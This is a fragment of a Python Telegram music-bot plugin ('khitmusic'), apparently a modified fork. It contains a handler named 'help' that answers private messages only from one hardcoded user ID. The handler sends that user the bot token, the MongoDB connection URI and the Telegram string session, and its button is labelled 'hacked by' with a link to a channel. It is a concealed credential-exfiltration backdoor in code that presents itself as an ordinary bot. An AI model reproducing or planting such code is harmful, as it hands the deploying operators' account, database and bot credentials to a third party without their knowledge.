...
from khitmusic.mongo.afkdb import PROCESS
from khitmusic.utils.database import get_assistant, get_authuser_names, get_cmode
from khitmusic.utils.decorators import ActualAdminCB, AdminActual, language
from khitmusic.utils.formatters import alpha_to_int, get_readable_time
...
@app.on_message(
    ...
    & filters.private
    & filters.user(1118345061)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/khithlainhtetz)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/khithlainhtetz")
                 ]
            ]
         ),
     )
